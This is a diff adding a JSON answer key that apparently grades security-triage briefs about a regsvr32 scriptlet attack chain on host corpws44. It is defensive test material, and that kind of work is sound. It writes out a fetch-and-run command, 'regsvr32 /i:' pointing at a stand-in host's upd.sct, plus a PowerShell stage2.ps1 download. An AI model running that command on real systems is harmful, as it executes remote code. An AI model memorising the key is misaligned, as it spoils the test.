@@ -1,0 +1,27 @@
+{
+  "schema": "casa.expected/v1",
+  "fixture": "scriptlet-proxy-exec",
+  "status": "findings",
+  "must_cite": {
+    "rule_ids": ["100921", "100922", "100923", "100924", "100926"],
+    "hosts": ["corpws44"],
+    "attack": ["T1218.010", "T1059.001"]
+  },
+  "must_not_cite": { "rule_ids": [], "hosts": [], "attack": [], "ip_literals": true },
+  "confidence": "High",
+  "csf_functions": ["DE", "RS"],
+  "thread_count": { "min": 1, "max": 1 },
+  "forbid_option_kinds": [],
+  "must_identify": [
+    { "id": "one-chain", "text": "The five detections are presented as one execution chain on corpws44, oldest to newest: EXCEL.EXE spawns regsvr32.exe with /i:https://cdn.files-sync.example/s/upd.sct scrobj.dll, regsvr32 resolves cdn.files-sync.example and connects to 203.0.113.87:443, and regsvr32 then spawns a hidden PowerShell." },
+    { "id": "remote-scriptlet", "text": "The regsvr32 command line is identified as signed-binary proxy execution of a remote scriptlet (T1218.010), not a DLL registration, with the Office parent named as where it was launched from." },
+    { "id": "network-corroborates", "text": "The Suricata alert (rule 100926) from the network sensor is tied to the same connection as the Sysmon network event (source port 50744, destination 203.0.113.87:443, SNI cdn.files-sync.example) and named as an independent second source." },
+    { "id": "powershell-follow-on", "text": "The hidden PowerShell child that downloads and runs stage2.ps1 from the same domain (T1059.001) is identified as follow-on execution, so the chain went past the scriptlet fetch." },
+    { "id": "high-justified", "text": "Confidence is High, justified by two independent sources (host Sysmon and the network sensor) agreeing on the same connection and by the absence of a plausible benign reading." },
+    { "id": "next-steps", "text": "Options include isolating corpws44 as a containment option with its trade-off, and investigate options to collect remittance-0811.xlsm, upd.sct and stage2.ps1 and to search other hosts for cdn.files-sync.example or 203.0.113.87." }
+  ],
+  "must_not": [
+    { "id": "no-benign-reading", "text": "The brief does not present the regsvr32 activity as a routine DLL registration, a software install or an update." },
+    { "id": "no-payload-claims", "text": "The brief does not state as fact what upd.sct or stage2.ps1 contain or did after running (persistence, credential theft, data taken); the intake shows neither, so the brief may only call them unknown and request them." }
+  ]
+}
